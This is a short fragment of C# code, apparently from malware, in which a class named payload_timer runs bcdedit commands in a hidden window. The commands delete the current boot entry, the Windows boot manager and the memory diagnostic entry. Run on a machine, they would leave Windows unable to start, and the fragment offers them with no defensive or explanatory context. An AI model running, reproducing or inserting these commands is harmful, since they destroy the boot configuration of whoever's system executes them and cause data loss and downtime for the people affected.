...
namespace version1
{
    public class payload_timer
    {
        ...
        public void timer()
        {
            ...
            cmd_h.cmd_process("bcdedit", "/delete {current} /f", ProcessWindowStyle.Hidden);
            cmd_h.cmd_process("bcdedit", "/delete {bootmgr} /f", ProcessWindowStyle.Hidden);
            cmd_h.cmd_process("bcdedit", "/delete {memdiag} /f", ProcessWindowStyle.Hidden);
            Random rand;
